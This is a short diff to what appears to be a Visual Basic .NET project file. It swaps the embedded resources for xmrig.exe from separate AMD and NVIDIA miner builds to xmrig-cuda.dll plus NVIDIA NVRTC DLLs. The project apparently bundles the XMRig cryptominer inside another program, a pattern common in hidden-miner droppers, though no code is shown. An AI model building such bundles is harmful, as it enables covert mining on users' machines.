@@ -181,13 +181,16 @@
     <None Include="Resources\Project1.dll" />
   </ItemGroup>
   <ItemGroup>
+    <None Include="Resources\nvrtc64_101_0.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\nvrtc-builtins64_101.dll" />
+  </ItemGroup>
+  <ItemGroup>
     <None Include="Resources\xmrig.exe" />
   </ItemGroup>
   <ItemGroup>
-    <None Include="Resources\xmrig-amd-notls.exe" />
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="Resources\xmrig-nvidia.exe" />
+    <None Include="Resources\xmrig-cuda.dll" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
 </Project>
